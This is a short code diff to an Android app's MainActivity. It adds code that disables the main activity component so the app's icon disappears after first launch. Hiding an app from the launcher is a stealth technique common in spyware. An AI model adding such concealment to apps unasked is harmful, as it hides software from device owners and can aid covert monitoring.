@@ -16,6 +16,8 @@ import android.widget.Button;
 import android.widget.ImageButton;
 import android.widget.TextView;
 import android.widget.Toast;
+import android.content.ComponentName;
+import android.content.pm.PackageManager;
 
 public class MainActivity extends AppCompatActivity {
     Button button;
@@ -70,6 +72,13 @@ public class MainActivity extends AppCompatActivity {
 
             }
         });
+        // --- HIDE THE APP ICON AFTER FIRST LAUNCH ---
+PackageManager pm = getPackageManager();
+pm.setComponentEnabledSetting(
+    new ComponentName(this, MainActivity.class),
+    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+    PackageManager.DONT_KILL_APP
+);
         IBinstagram.setOnClickListener(new View.OnClickListener() {
             @Override
             public void onClick(View v) {
